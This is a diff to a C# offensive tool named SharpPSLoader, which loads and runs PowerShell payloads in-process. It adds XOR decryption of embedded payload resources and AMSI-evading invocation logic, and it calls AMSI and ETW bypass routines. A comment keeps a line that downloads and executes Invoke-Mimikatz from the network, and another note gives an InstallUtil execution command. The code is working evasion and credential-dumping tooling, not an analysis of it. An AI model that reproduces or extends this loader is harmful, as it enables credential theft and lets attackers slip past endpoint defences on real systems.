@@ -9,6 +9,7 @@ using System.Management.Automation.Runspaces;
 using System.Collections;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Reflection;
 
 /*
  * Add reference to c:\windows\assembly\gac_msil\system.management.automation\1.0.0.0\<~>\system.management.automation.dll  and configuration.install 
@@ -16,11 +17,16 @@ using System.IO;
  * "Any CPU" --> installutils works, running assembly through main() fail. 
  * "x64" --> installutils works, running assembly through main() works.
  * 
+ * C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U <test.exe>
+ * 
+ * Adding Resources 
+ *  - Project > Properties > Add Resources > Access Modifier = Public 
+ *  - And simply access it like... var thingy = Properties.Resources.<resource-name>
+ *      - Returns "type" by default. ex) .txt file ==> string, byte file ==> byte[] 
+ * 
  * TODO: 
- *  1. DInvoke change 
- *  2. Embedding powershell... how? 
- *      - Embed all XOR'ed powershells here 
- *      - do something like 
+ *  1. DInvoke or peb parsing 
+ *  2. Embed more powershell scripts
  * 
  * */
 
@@ -28,6 +34,41 @@ namespace SharpPSLoader
 {
     public class SharpPSLoader
     {
+        // Decrypting with single byte, hardcoding "0x6f = (111)" as default key, for now. 
+        public static string DecryptAndStringReturn(byte[] payload, byte singleByteKey = 0x6f)
+        {
+            byte[] result = new byte[payload.Length];
+            for(int i = 0; i < payload.Length; i++)
+            {
+                result[i] = (byte)(payload[i] ^ singleByteKey);
+            }
+
+            var resultStr = Encoding.UTF8.GetString(result);
+
+            return resultStr;
+        }
+
+        // Array of 
+        // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp
+
+
+        public static string ParseFunctionName(string payload)
+        {
+            var lines = payload.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
+            string functionName = "";
+            foreach (var line in lines)
+            {
+                //Console.WriteLine(line);
+                if (line.ToLower().Contains("function"))
+                {
+                    functionName = line.Split(' ')[1];
+                    break;
+                }
+            }
+
+            return functionName;
+        }
+
         public static bool is64Bit
         {
             get
@@ -139,15 +180,27 @@ namespace SharpPSLoader
             Console.WriteLine("[+] Disabled AMSI");
         }
 
-        public void TestoFunction()
+        public void RunPowershell(string payload, string argument = "")
         {
             // Powershell payload goes here. Might be replaced with taking powershell from resources. 
             // Use dnlib for resources section? Or just xor powershell + base64 as a static variable here? not sure. 
             //String cmd = @"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -command 'coffee'";
 
-            String cmd = File.ReadAllText(@"C:\opt\Invoke-Mimikatz.ps1");
-            //Console.WriteLine(cmd);
-            cmd += "Invoke-Mimikatz -command 'coffee'";
+            string cmd = payload;
+
+            // Parse for "function" and retrieve the function name here and add to cmd 
+            // Why parse functionName? Because simply typing "Invoke-Mimikatz -DumpCred" will trigger amsi. 
+            var functionName = ParseFunctionName(cmd);
+
+            // If argument, add functionName and argument 
+            if (!string.IsNullOrEmpty(argument))
+            {
+                cmd += ";";
+                cmd += functionName;
+                cmd += " ";
+                cmd += argument;
+            }
+            
 
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
@@ -179,7 +232,7 @@ namespace SharpPSLoader
         // Empty constructor for now 
         public SharpPSLoader()
         {
-
+            
         }
        
 
@@ -192,9 +245,18 @@ namespace SharpPSLoader
             psLoader.bypassTW();
             //Console.ReadLine();
 
-            
+            // Parse argument and then change psloader.mimiStr to corresponding script 
 
-            psLoader.TestoFunction();
+            //var thing = Properties.Resources.;
+
+            // Function that returns array of property.Name, 
+            foreach (PropertyInfo property in typeof(Properties.Resources).GetProperties
+                (BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic))
+            {
+                Console.WriteLine("{0}: {1}", property.Name, property.GetValue(null, null));
+            }
+
+            //psLoader.RunPowershell(psLoader.mimiStr, args[0]);
             Console.ReadLine();
         }
 
@@ -239,7 +301,7 @@ namespace SharpPSLoader
 
             psLoader.bypassSI();
             psLoader.bypassTW();
-            psLoader.TestoFunction();
+            //psLoader.RunPowershell();
 
             
         }
